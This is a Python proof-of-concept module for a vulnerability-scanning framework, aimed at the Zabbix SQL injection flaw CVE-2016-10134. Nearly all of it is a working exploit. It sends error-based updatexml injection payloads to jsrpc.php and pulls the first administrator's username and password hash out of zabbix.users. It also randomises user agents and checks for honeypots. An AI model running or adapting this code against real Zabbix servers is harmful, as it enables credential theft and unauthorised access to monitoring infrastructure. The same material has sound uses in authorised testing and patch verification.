# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, re_search_content
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Zabbix SQL 注入漏洞(CVE-2016-10134)",  # 漏洞名称
        "VulnID": "CVE-2016-10134",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Zabbix",  # 漏洞应用名称
        "AppVersion": "Zabbix 2.2.14之前的版本和3.0.4之前的3.0版本",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            一个insert报错注入
        """,  # 漏洞简要描述

        "fofa-dork": """
        
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url0 = self.target + "/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,concat(0x404F465840,substr((select%20alias%20from%20zabbix.users%20limit%200,1),1,16),0x404F465840)),0)"  # url自己按需调整
        url1 = self.target + "/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,concat(0x404F465840,substr((select%20passwd%20from%20zabbix.users%20limit%200,1),1,16),0x404F465840)),0)"
        url2 = self.target + "/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,concat(0x404F465840,substr((select%20passwd%20from%20zabbix.users%20limit%200,1),17,16),0x404F465840)),0)"

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if "@OFX@" in req0.text and "zbx_sessionid" in req0.headers["Set-Cookie"]:
                user_name = re_search_content("@OFX@[a-zA-Z0-9:]+@OFX@", content=req0.text)[5:-5]

                req1 = requests.get(url1, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
                passwd = re_search_content("@OFX@[a-zA-Z0-9:]+@OFX@", content=req1.text)[5:-5]
                req2 = requests.get(url2, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
                passwd = passwd + re_search_content("@OFX@[a-zA-Z0-9:]+@OFX@", content=req2.text)[5:-5]

                vuln = [
                    True,
                    "<title>" + user_name + "/" + passwd + "</title>"
                ]
            else:
                vuln = [False, req0.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
